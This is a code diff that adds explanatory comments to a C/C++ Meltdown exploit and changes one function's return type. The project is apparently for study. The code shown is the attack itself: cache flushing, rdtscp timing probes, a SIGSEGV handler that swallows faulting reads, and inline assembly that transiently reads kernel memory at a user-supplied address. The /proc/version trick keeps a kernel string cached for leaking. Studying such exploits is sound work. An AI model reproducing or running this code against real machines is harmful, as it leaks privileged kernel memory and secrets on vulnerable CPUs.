@@ -26,7 +26,7 @@ void init_probe_sequence(void);
 void flush_cache(void);
 void sigsegv_handler(int sig);
 static inline void mem_access(void *p);
-int read_byte(char* addr);
+uint8_t read_byte(char* addr);
 void flush_cache(void);
 static inline int get_access_time(char *addr);
 uint8_t recover_secret(void);
@@ -36,20 +36,26 @@ void unix_error(char *msg);
 
 int main(int argc, char *argv[])
 {
+    // init probe sequence
     init_probe_sequence();
+    // allocate memory space for cache array, 4KB alignment required
     cache = (uint8_t *) aligned_alloc(page_size, page_size * possible_value_nums);
     memset(cache, 0, page_size * possible_value_nums);
+    // count is used to store how many times of hits for every 256 possible value
     std::vector<int> count(256, 0);
     std::string secret_recovered;
 
     unsigned long addr_input;
     unsigned long size;
 
+    // starting address
     sscanf(argv[1], "%lx", &addr_input);
+    // length to read (in hexadecimal)
     sscanf(argv[2], "%lx", &size);
     
     char *addr = (char *) addr_input;
 
+    // open `/proc/version` to keep linux_proc_banner in memory
     if ((fd = open("/proc/version", O_RDONLY)) < 0)
         unix_error((char *) "failed to open /proc/version");
 
@@ -73,6 +79,7 @@ int main(int argc, char *argv[])
 
 void sigsegv_handler(int sig)
 {
+    // jump to the `meltdown_attack` function whenever encounter SIGSEGV signal
     siglongjmp(jmp_buffer, 1);
     return;
 }
@@ -85,16 +92,18 @@ void init_probe_sequence(void)
 
 void flush_cache(void)
 {
+    // flush the memory
     for (int i = 0; i != possible_value_nums; ++i)
         __builtin_ia32_clflush((void *) ((unsigned long) cache + page_size * i));
 }
 
 static inline void mem_access(void *p)
 {
+    // memory access thorugh a single `mov` instruction
     asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
 }
 
-int read_byte(char* addr)
+uint8_t read_byte(char* addr)
 {
     static char buf[256];
     memset(cache, 0, page_size * possible_value_nums);
@@ -109,7 +118,9 @@ static inline int get_access_time(char *addr)
 {
     unsigned long long time_begin, time_end;
     unsigned junk;
+    // use `__rdtscp` instruction to get time, defined in `x86intrin.h`
     time_begin = __rdtscp(&junk);
+    // memory access
     mem_access(addr);
     time_end = __rdtscp(&junk);
     return time_end - time_begin;
@@ -123,10 +134,11 @@ uint8_t recover_secret(void)
     int time;
     int min_time = INT_MAX;
     int hit_value = 0;
-
+    
     std::random_shuffle(probe_sequence.begin(), probe_sequence.end());
     for (int i = 0; i != possible_value_nums; ++i)
     {
+        // random access in order to avoid cache prediction
         value_probe = probe_sequence[i];
         addr = (char *) ((unsigned long) cache + value_probe * page_size);
         time = get_access_time(addr);
@@ -141,8 +153,10 @@ uint8_t recover_secret(void)
 
 static void __attribute__((noinline)) meltdown_attack(char* addr)
 {
+    // only execute attack code when not jump fron signal handler
     if (!sigsetjmp(jmp_buffer, 1)) {
     __asm__ volatile(
+        // repeat 300 times to make a delay
 		".rept 300\n\t"
 		"add $0x141, %%rax\n\t"
 		".endr\n\t"
@@ -169,7 +183,7 @@ handler_t *Signal(int signum, handler_t *handler)
     action.sa_handler = handler;
     sigemptyset(&action.sa_mask); /* block sigs of type being handled */
     sigaddset(&action.sa_mask, SIGSEGV);
-    action.sa_flags = SA_INTERRUPT; /* restart syscalls if possible */
+    action.sa_flags = SA_INTERRUPT;
 
     if (sigaction(signum, &action, &old_action) < 0)
         unix_error((char *) "Signal error");
